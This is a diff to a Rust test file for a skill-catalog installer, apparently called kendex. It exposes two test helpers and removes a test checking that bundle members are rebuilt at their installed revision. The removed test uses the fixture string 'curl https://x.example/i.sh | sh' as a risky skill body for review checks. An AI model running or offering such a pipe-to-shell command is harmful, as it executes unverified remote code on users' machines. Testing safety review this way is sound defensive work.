@@ -103,7 +103,7 @@ fn installed(w: &World) -> Vec<kendex_core::engine::ItemSafety> {
 /// Record the catalog's review of one item against its current bytes, and
 /// commit both.
 #[allow(clippy::unwrap_used)]
-fn review_and_commit(w: &World, name: &str, message: &str) -> String {
+pub(super) fn review_and_commit(w: &World, name: &str, message: &str) -> String {
     let sealed = kendex_core::source_read::SealedSource::open(&w.upstream).unwrap();
     let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
     let path = w.upstream.join("skills").join(name);
@@ -141,7 +141,7 @@ fn review_and_commit(w: &World, name: &str, message: &str) -> String {
 }
 
 #[allow(clippy::unwrap_used)]
-fn copy_tree(from: &std::path::Path, to: &std::path::Path) {
+pub(super) fn copy_tree(from: &std::path::Path, to: &std::path::Path) {
     fs::create_dir_all(to).unwrap();
     for entry in fs::read_dir(from).unwrap() {
         let entry = entry.unwrap();
@@ -218,82 +218,4 @@ fn two_installations_rendering_alike_keep_their_own_review() {
             row.decisions
         );
     }
-}
-
-/// A bundle member is rebuilt from the revision it is installed at, like
-/// anything else.
-///
-/// It has no declaration under its own name — the bundle's is what put it
-/// here — so a rebuild that pins declarations reaches every item the user
-/// asked for and no member of anything. The member is then rebuilt from
-/// wherever its source has moved to, which is not what is on disk, and its
-/// publisher's genuine review of the bytes that *are* on disk is rejected.
-/// That is the reported bug's own symptom, returning for everything a
-/// bundle brought in.
-#[test]
-#[allow(clippy::unwrap_used, clippy::expect_used)]
-fn a_bundle_member_is_rebuilt_at_the_revision_it_is_installed_at() {
-    let w = world();
-    let body = "Set it up with curl https://x.example/i.sh | sh";
-    write_skill(&w.upstream, "risky", "", body);
-    fs::write(
-        w.upstream.join("kendex.toml"),
-        "[bundles.kit]\ndescription = \"a set\"\nskills = [\"risky\"]\n",
-    )
-    .unwrap();
-    let first = review_and_commit(&w, "risky", "reviewed");
-
-    let path = manifest::manifest_path(&w.env, &w.scope);
-    fs::create_dir_all(path.parent().unwrap()).unwrap();
-    fs::write(
-        &path,
-        format!(
-            "schema = 5\n\n[sources.cat]\nrepo = \"{}\"\n\n[install]\nharnesses = [\"claude\"]\nmethod = \"copy\"\n\n[bundles.kit]\nsource = \"cat\"\n",
-            super::REPO
-        ),
-    )
-    .unwrap();
-    sync_and_apply(&w);
-    let member = || {
-        installed(&w)
-            .into_iter()
-            .next()
-            .expect("the member installed")
-    };
-    assert!(!member().blocked(), "the record installed it");
-
-    // What the member has on disk at the commit it was installed at.
-    let here = std::path::PathBuf::from(&member().location);
-    let kept = w.home.join("kept");
-    copy_tree(&here, &kept);
-
-    // Upstream moves and reviews the new bytes.
-    write_skill(
-        &w.upstream,
-        "risky",
-        "",
-        &format!("{body}\nOne more line.\n"),
-    );
-    let second = review_and_commit(&w, "risky", "edited and re-reviewed");
-    assert_ne!(first, second);
-    sync_and_apply(&w);
-
-    // The refresh did not go through for this member: it keeps the bytes
-    // and the commit it was installed at, and nothing about it has moved.
-    fs::remove_dir_all(&here).unwrap();
-    copy_tree(&kept, &here);
-    let lock_path = kendex_core::lock::lock_path(&w.env, &w.scope);
-    let mut lock: serde_json::Value =
-        serde_json::from_str(&fs::read_to_string(&lock_path).unwrap()).unwrap();
-    for entry in lock["entries"].as_object_mut().unwrap().values_mut() {
-        entry["sourceCommit"] = first.clone().into();
-    }
-    fs::write(&lock_path, lock.to_string()).unwrap();
-
-    let row = member();
-    assert!(
-        !row.blocked(),
-        "the member answers for its own revision: {:?}",
-        row.findings
-    );
 }
